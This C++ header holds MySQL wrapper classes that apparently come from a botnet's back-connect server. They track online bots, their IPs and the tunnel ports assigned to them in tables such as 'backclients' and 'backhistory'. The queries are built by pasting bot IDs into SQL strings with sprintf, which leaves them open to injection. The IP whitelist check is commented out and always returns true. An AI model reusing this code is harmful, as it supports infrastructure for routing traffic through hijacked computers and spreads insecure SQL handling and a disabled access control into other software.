#pragma once
#include <include\mysql.h>
#pragma comment (lib, "lib\\libmysql.lib")

class commondb
{
public:
	commondb(void)
	{
		isConnected = false;
		InitializeCriticalSection(&csDBSync);
	}

	~commondb(void)
	{
		Disconnect();
		DeleteCriticalSection(&csDBSync);
	}

	bool Connect()
	{
		EnterCriticalSection(&csDBSync);

		if (!isConnected)
		{
			dbg("in ");

			try
			{
				TDBSettings settings;
				if (!GetDBSettings(settings))
					throw "settings";

				if (!mysql_init(&m_DBHandle))
				{
					dbg("ERROR mysql_init");
					throw "mysql_init";
				}

				if (!mysql_real_connect(&m_DBHandle, settings.Serv, settings.User, settings.Pass, settings.Data, settings.Port, NULL, 0))
				{
					dbg("ERROR mysql_real_connect");
					throw "mysql_real_connect";
				}

				if (mysql_select_db(&m_DBHandle, settings.Data))
				{
					dbg("ERROR mysql_select_db");
					throw "mysql_select_db";
				}

				dbg("ok");
				isConnected = true;
			}
			catch (...)
			{
				mysql_close(&m_DBHandle);
			}
		}

		LeaveCriticalSection(&csDBSync);

		return isConnected;
	}

	bool Disconnect()
	{
		EnterCriticalSection(&csDBSync);

		if (isConnected)
		{
			mysql_close(&m_DBHandle);
			isConnected = false;
		}

		LeaveCriticalSection(&csDBSync);

		return true;
	}

	bool Execute(const char* Query)
	{
		bool bRes = false;

		EnterCriticalSection(&csDBSync);

		if (CheckConnection())
		{
			mysql_query(&m_DBHandle, Query);
			if (mysql_errno(&m_DBHandle))
			{
				dbg("ERROR");
				Disconnect();
			}
			else
				bRes = true;
		}

		LeaveCriticalSection(&csDBSync);

		return bRes;
	}

	unsigned int GetUint(const char* Query)
	{
		unsigned int uRes = 0;

		EnterCriticalSection(&csDBSync);

		if (CheckConnection())
		{
			MYSQL_RES* res;
			MYSQL_ROW  row;

			if (mysql_query(&m_DBHandle, Query))
			{
				Disconnect();
			}
			else
			{
				if (NULL == (res = mysql_store_result(&m_DBHandle)))
				{
					Disconnect();
				}
				else
				{
					if (res->row_count != 0) 
					{
						row = mysql_fetch_row(res);
						uRes = atoi(row[0]);	
					}
					mysql_free_result(res);
				}
			}
		}

		LeaveCriticalSection(&csDBSync);

		return uRes;
	}

	std::vector<std::string> GetStringList(const char* Query)
	{
		std::vector<std::string> lRes;

		EnterCriticalSection(&csDBSync);

		if (CheckConnection())
		{
			MYSQL_RES* res;
			MYSQL_ROW  row;

			if (mysql_query(&m_DBHandle, Query))
			{
				Disconnect();
			}
			else
			{
				if (NULL == (res = mysql_store_result(&m_DBHandle)))
				{
					Disconnect();
				}
				else
				{
					if (res->row_count != 0) 
					{
						while (row = mysql_fetch_row(res))
						{
							lRes.push_back(std::string(row[0]));
						}
					}
					mysql_free_result(res);
				}
			}
		}

		LeaveCriticalSection(&csDBSync);

		return lRes;
	}

private:
	CRITICAL_SECTION csDBSync;
	MYSQL m_DBHandle;

	bool isConnected;
	bool CheckConnection()
	{
		EnterCriticalSection(&csDBSync);

		if (!isConnected)
			Connect();

		LeaveCriticalSection(&csDBSync);

		return isConnected;
	}
};

class backdb
{
public:
	bool init()
	{
		return db.Connect() && db.Execute("TRUNCATE backclients");
	}

	void stop()
	{
		db.Execute("TRUNCATE backclients");
		db.Disconnect();
	}

	bool add(const TTunnelId& tunnel, const char* ip, unsigned int port)
	{
		char InsertQuery[0x1000];
		sprintf_s(InsertQuery, "INSERT INTO backclients (botid, botip, type, botport, onlinefrom) VALUES ('%s', '%s', '%s', %u, CURRENT_TIMESTAMP)", tunnel.bot.data(), ip, tunnel.typestring().data(), port);
		dbg("%s", InsertQuery);
		return db.Execute(InsertQuery);
	}

	bool del(const TTunnelId& tunnel)
	{
		char DeleteQuery[0x1000];
		sprintf_s(DeleteQuery, "DELETE FROM backclients WHERE botid='%s' AND type='%s'", tunnel.bot.data(), tunnel.typestring().data());
		dbg("%s", DeleteQuery);
		return db.Execute(DeleteQuery);
	}

private:
	commondb db;
};

class historydb
{
public:
	bool init()
	{
		return db.Connect();
	}

	void stop()
	{
		db.Disconnect();
	}

	unsigned int get(const TTunnelId& tunnel)
	{
		char GetQuery[0x1000];
		sprintf_s(GetQuery, "SELECT port FROM backhistory WHERE botid='%s' AND type=%u", tunnel.bot.data(), tunnel.type);
		dbg("%s", GetQuery);
		return ntohs(db.GetUint(GetQuery));
	}

	unsigned int getfree()
	{
		char GetQuery[0x1000];
		sprintf_s(GetQuery, "SELECT h1.port+1 FROM backhistory h1 LEFT JOIN backhistory h2 ON h1.port = h2.port-1 WHERE h2.port IS NULL LIMIT 1");
		dbg("%s", GetQuery);
		unsigned int t = db.GetUint(GetQuery);
		if (t == 1) 
			t = 10000;
		return ntohs(t);
	}

	bool add(const TTunnelId& tunnel)
	{
		char InsertQuery[0x1000];
		sprintf_s(InsertQuery, "INSERT IGNORE INTO backhistory VALUES ('%s', %u, 0)", tunnel.bot.data(), tunnel.type);
		dbg("%s", InsertQuery);
		return db.Execute(InsertQuery);
	}

	bool update(const TTunnelId& tunnel, const unsigned int port)
	{
		char UpdateQuery[0x1000];
		sprintf_s(UpdateQuery, "UPDATE backhistory SET port = %d WHERE botid='%s' AND type=%u",	port, tunnel.bot.data(), tunnel.type);
		dbg("%s", UpdateQuery);
		return db.Execute(UpdateQuery);
	}

private:
	commondb db;
};

class acldb
{
public:
	bool init()
	{
		InitializeCriticalSection(&sync);
		bool ok = db.Connect();
		update();
		return ok;
	}

	void stop()
	{
		db.Disconnect();
		DeleteCriticalSection(&sync);
	}

	bool check(unsigned int ip)
	{
		return true;

		//bool ok = false;
		//
		//EnterCriticalSection(&sync);

		//in_addr addr;
		//addr.s_addr = ip;

		//ok = CheckAccess(&whitelist, ip);
		//if (!ok)
		//{
		//	static unsigned int lastip = 0;
		//	if (ip != lastip)
		//	{
		//		lastip = ip;
		//		update();
		//	}
		//}

		//dbg("check ip %s, result %d", inet_ntoa(addr), ok);
		//LeaveCriticalSection(&sync);
		//return ok;
	}

private:

	void update()
	{
		char GetQuery[0x1000];
		sprintf_s(GetQuery, "SELECT netmask FROM accesslist LIMIT 100");
		dbg("%s", GetQuery);
		auto dblist = db.GetStringList(GetQuery);

		if (dblist.size())
		{
			whitelist.empty();

			for (auto& aclstring : dblist)
			{
				TAccessEntry acldata;
				std::vector<char> temp(aclstring.begin(), aclstring.end());
				temp.push_back(0);

				char * slash = strrchr(&temp[0], '/');
				acldata.mask = slash ? atoi(slash + 1) : 0;
				acldata.mask = ((0xffffffff) >> (32 - acldata.mask));

				if (slash)
					slash[0] = 0;

				sockaddr_in addressData;
				addressData.sin_family = AF_INET;
				int addressLen = sizeof(addressData);
				if (SOCKET_ERROR != WSAStringToAddressA(&temp[0], AF_INET, NULL, (LPSOCKADDR)&addressData, &addressLen))
				{
					acldata.ip = addressData.sin_addr.s_addr;

					dbg("acldata ip %s, mask %08X", inet_ntoa(addressData.sin_addr), acldata.mask);

					whitelist.push_back(acldata);
				}
			}
		}
	}

	commondb db;
	TAccessList whitelist;
	CRITICAL_SECTION sync;
};